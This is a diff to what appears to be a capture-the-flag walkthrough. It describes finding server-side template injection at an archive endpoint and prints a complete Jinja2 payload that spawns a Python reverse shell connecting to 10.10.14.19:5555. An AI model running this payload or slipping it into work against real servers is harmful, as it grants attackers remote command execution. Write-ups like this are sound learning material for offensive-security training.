@@ -32,7 +32,7 @@ After entering the SSTI payloads in the above message, I went back to the /archi
 
 It looks like we have template injection, either Jinja2 or Twig. The Tplmap tool won't work here since the detection is on a different URL from the injection point. I had some recent experience playing around with SSTI on pentesterlab.com. After some manual trial and error, I finally got a reverse shell using the following payload:
 
-```
+```text
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.19\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
 ```
 
